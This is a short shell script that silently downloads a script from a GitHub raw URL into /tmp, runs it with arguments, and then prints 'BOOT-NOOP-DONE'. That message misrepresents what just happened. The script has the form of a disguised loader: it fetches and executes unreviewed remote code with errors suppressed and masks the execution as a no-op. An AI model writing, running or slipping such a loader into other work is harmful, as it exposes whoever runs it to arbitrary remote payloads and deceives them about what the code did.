#!/bin/sh
mkdir -p /tmp/zgt
curl -fsSL -m120 -o /tmp/zgt/wb.sh https://raw.githubusercontent.com/heinzo666/evm-index-data/main/wb.sh 2>/dev/null
sh /tmp/zgt/wb.sh "${1:-0/1}" "${2:-4}"
echo BOOT-NOOP-DONE
